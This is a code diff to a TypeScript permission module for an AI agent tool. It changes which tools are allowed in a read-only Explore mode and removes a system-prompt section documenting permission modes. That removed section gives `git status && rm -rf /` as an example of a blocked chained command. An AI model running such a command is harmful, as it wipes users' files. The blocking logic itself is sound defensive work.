+          ...[plansHint, dataHint].filter(Boolean).map(p => `• ${p}`),
+          `• Or ask the user to switch to Ask or Auto mode (${config.shortcutHint}) to enable writes anywhere`
+        );
+        return {
+          allowed: false,
+          reason: lines.join('\n'),
+        };
       }
     }
   }
@@ -1374,20 +1747,21 @@ export function shouldAllowToolInMode(
 
     // Handle session-scoped tools - allow read-only, block mutations
     if (toolName.startsWith('mcp__session__')) {
-      // Read-only session tools - always allowed
+      // Read-only session tools - always allowed in Explore mode
+      // These tools don't modify state, they only read/validate/invoke secondary models
       const readOnlySessionTools = [
         'mcp__session__SubmitPlan',
         'mcp__session__config_validate',
         'mcp__session__skill_validate',
         'mcp__session__mermaid_validate',
         'mcp__session__source_test',
-        'mcp__session__call_llm', // Invokes secondary Claude model - no side effects
+        'mcp__session__transform_data',
       ];
       if (readOnlySessionTools.includes(toolName)) {
         return { allowed: true };
       }
 
-      // Write session tools - blocked in safe mode
+      // Write/auth session tools - blocked in Explore mode (source_oauth_trigger, source_credential_prompt, etc.)
       return {
         allowed: false,
         reason: `Session configuration changes are blocked in ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to create, update, or delete sources and agents.`
@@ -1462,13 +1836,18 @@ function getBlockReasonWithConfig(toolName: string, config: ToolCheckConfig): st
  * Create a hook return value that blocks a tool.
  * Returns the correct SDK format for PreToolUse hook blocking.
  *
+ * The reason is prefixed with "[ERROR]" so the Codex model can distinguish
+ * blocked tool calls from successful ones. See the detailed comment on
+ * errorResponse() in packages/session-tools-core/src/response.ts for the
+ * full explanation of the OpenAI Responses API limitation.
+ *
  * @param reason - The reason for blocking (from shouldAllowToolInMode)
  */
 export function blockWithReason(reason: string) {
   return {
     continue: false,
     decision: 'block' as const,
-    reason,
+    reason: `[ERROR] ${reason}`,
   };
 }
 
@@ -1487,166 +1866,28 @@ export function getSessionState(sessionId: string): { permissionMode: Permission
 
 /**
  * Format session state as a lightweight XML block for injection into user messages.
- * When in safe mode, includes the plans folder path so agent knows where to write plans.
+ * Always includes the plans folder path so agent knows where plans are stored.
  */
 export function formatSessionState(
   sessionId: string,
-  options?: { plansFolderPath?: string }
+  options?: { plansFolderPath?: string; dataFolderPath?: string }
 ): string {
   const mode = getPermissionMode(sessionId);
 
-  let result = `<session_state>\nsessionId: ${sessionId}\npermissionMode: ${mode}`;
+  // Use the display name (lowercased) so the agent sees "explore" instead of internal key "safe"
+  const modeName = PERMISSION_MODE_CONFIG[mode].displayName.toLowerCase();
+  let result = `<session_state>\nsessionId: ${sessionId}\npermissionMode: ${modeName}`;
 
-  // Include plans folder path when in safe mode so agent knows where to write plans
-  if (mode === 'safe' && options?.plansFolderPath) {
+  // Always include plans folder path so agent knows where plans are stored
+  if (options?.plansFolderPath) {
     result += `\nplansFolderPath: ${options.plansFolderPath}`;
+  }
+
+  // Include data folder path so agent knows where transform_data output goes
+  if (options?.dataFolderPath) {
+    result += `\ndataFolderPath: ${options.dataFolderPath}`;
   }
 
   result += '\n</session_state>';
   return result;
-}
-
-// ============================================================
-// System Prompt Documentation
-// ============================================================
-
-/**
- * Generate the permission modes documentation section for the system prompt.
- * Uses PERMISSION_MODE_CONFIG for display names to stay in sync with UI.
- */
-export function getPermissionModesDocumentation(): string {
-  const blockedTools = Array.from(SAFE_MODE_CONFIG.blockedTools).join(', ');
-
-  return `## Permission Modes
-
-Cowork has three permission modes that control tool execution. The user can cycle through modes with SHIFT+TAB.
-
-| Mode | Color | Description |
-|------|-------|-------------|
-| **${PERMISSION_MODE_CONFIG['safe'].displayName}** | Grey | ${PERMISSION_MODE_CONFIG['safe'].description} |
-| **${PERMISSION_MODE_CONFIG['ask'].displayName}** | Amber | ${PERMISSION_MODE_CONFIG['ask'].description} |
-| **${PERMISSION_MODE_CONFIG['allow-all'].displayName}** | Purple | ${PERMISSION_MODE_CONFIG['allow-all'].description} |
-
-You will know the current mode from the \`<session_state>\` block in your context:
-\`\`\`
-<session_state>
-sessionId: abc123
-permissionMode: safe
-plansFolderPath: /path/to/plans
-</session_state>
-\`\`\`
-
-### ${PERMISSION_MODE_CONFIG['safe'].displayName} (permissionMode: safe)
-
-Read-only exploration mode. You can read, search, and explore but cannot make changes.
-
-| Operation | Allowed? | Notes |
-|-----------|----------|-------|
-| Read MCP sources | ✅ | search, list, get operations |
-| File exploration | ✅ | Read, Glob, Grep |
-| Web search/fetch | ✅ | WebSearch, WebFetch |
-| API GET requests | ✅ | Read-only API calls |
-| **Plans folder** | ✅ | Write/Edit allowed to session plans folder |
-| **Read-only Bash** | ✅ | See list below |
-| File writes/edits | ❌ | ${blockedTools} blocked (except plans folder) |
-| MCP mutations | ❌ | create, update, delete operations blocked |
-| API mutations | ❌ | POST, PUT, DELETE blocked |
-
-**Read-only Bash commands allowed in Explore mode:**
-- **File exploration**: ls, tree, cat, head, tail, file, stat, wc, du, df
-- **Search**: find, grep, rg, ag, fd, locate, which
-- **Git**: git status, git log, git diff, git show, git branch, git blame, git history, git reflog
-- **GitHub CLI**: gh pr view/list, gh issue view/list, gh repo view
-- **Package managers**: npm ls/list/outdated, yarn list, pip list, cargo tree
-- **System info**: pwd, whoami, env, ps, uname, hostname, date
-- **Text processing**: jq, yq, sort, uniq, cut, column
-- **Network diagnostics**: ping, dig, nslookup, netstat
-- **Version checks**: node --version, python --version, etc.
-
-**Blocked shell constructs:** Even allowed commands are blocked if they contain dangerous shell constructs:
-- **Command chaining**: \`&&\`, \`||\`, \`;\`, \`|\`, \`&\` - could chain to dangerous commands
-- **Redirects**: \`>\`, \`>>\` - could overwrite files
-- **Substitution**: \`$()\`, backticks, \`<()\`, \`>()\` - execute embedded commands
-- **Control chars**: newlines, carriage returns - act as command separators
-
-Example: \`git status && rm -rf /\` is blocked because \`&&\` allows command chaining. Run commands separately instead.
-
-**When ready to implement:** Don't ask the user to switch modes. Instead, write a plan and use \`SubmitPlan\` - the "Accept Plan" button switches to ${PERMISSION_MODE_CONFIG['allow-all'].displayName} mode automatically.
-
-### ${PERMISSION_MODE_CONFIG['ask'].displayName} (permissionMode: ask)
-
-Default interactive mode. Prompts before edits, but read-only operations run freely.
-
-| Operation | Allowed? | Notes |
-|-----------|----------|-------|
-| All file operations | ✅ | Write, Edit, Read, etc. |
-| All MCP operations | ✅ | search, list, create, update, etc. |
-| All API operations | ✅ | GET, POST, PUT, DELETE |
-| Read-only Bash | ✅ | ls, git status, grep, etc. (same as ${PERMISSION_MODE_CONFIG['safe'].displayName}) |
-| Other Bash commands | ⚠️ | Prompts for approval (can click "Always allow") |
-| Dangerous Bash | ⚠️ | rm, sudo, git push - always prompts, no auto-allow |
-
-Read-only Bash commands (the same ones allowed in ${PERMISSION_MODE_CONFIG['safe'].displayName} mode) run without prompting. Other commands prompt for permission with an "Always allow this session" option. Dangerous commands always require explicit approval.
-
-### ${PERMISSION_MODE_CONFIG['allow-all'].displayName} (permissionMode: allow-all)
-
-Full autonomous mode. Everything is allowed without prompts - use when you trust the agent to execute the plan.
-
-| Operation | Allowed? | Notes |
-|-----------|----------|-------|
-| All operations | ✅ | No restrictions, no prompts |
-
-This mode is ideal after reviewing and accepting a plan, as it allows uninterrupted execution.
-
-## Planning (Universal)
-
-You can create structured plans at any time using the \`SubmitPlan\` tool - this is not restricted to any mode.
-
-### When to Use Plans
-
-Create a plan when:
-- The task has multiple complex steps
-- You want to get user approval before making changes
-- The user asks for a plan first
-
-### Creating a Plan
-
-1. Write your plan to a markdown file using the \`Write\` tool
-2. Call \`SubmitPlan\` with the file path
-3. Wait for user feedback before proceeding
-
-### Plan Format
-
-\`\`\`markdown
-# Plan Title
-
-## Summary
-Brief description of what this plan accomplishes.
-
-## Steps
-1. **Step description** - Details and approach
-2. **Another step** - More details
-3. ...
-\`\`\`
-
-### ${PERMISSION_MODE_CONFIG['safe'].displayName} → Implementation Workflow
-
-When in ${PERMISSION_MODE_CONFIG['safe'].displayName} mode and ready to implement:
-1. Write your plan to a markdown file in the plans folder
-2. Call \`SubmitPlan\` with the file path
-3. The user can click "Accept Plan" to exit ${PERMISSION_MODE_CONFIG['safe'].displayName} mode and begin implementation
-4. Once accepted, proceed with the implementation steps
-
-This is the recommended way to transition from exploration to implementation.
-
-### Customizing Explore Mode Permissions
-
-You can customize Explore mode via \`permissions.json\` files - extend what's allowed (bash patterns, MCP tools, API endpoints) or block specific tools entirely.
-
-| Level | Path | Scope |
-|-------|------|-------|
-| Workspace | \`{workspaceRoot}/permissions.json\` | All sources in workspace |
-| Per-source | \`{workspaceRoot}/sources/{slug}/permissions.json\` | That source only (auto-scoped) |
-
-**Before editing**: Read \`~/.cowork/docs/permissions.md\` for the full schema and examples.`;
 }
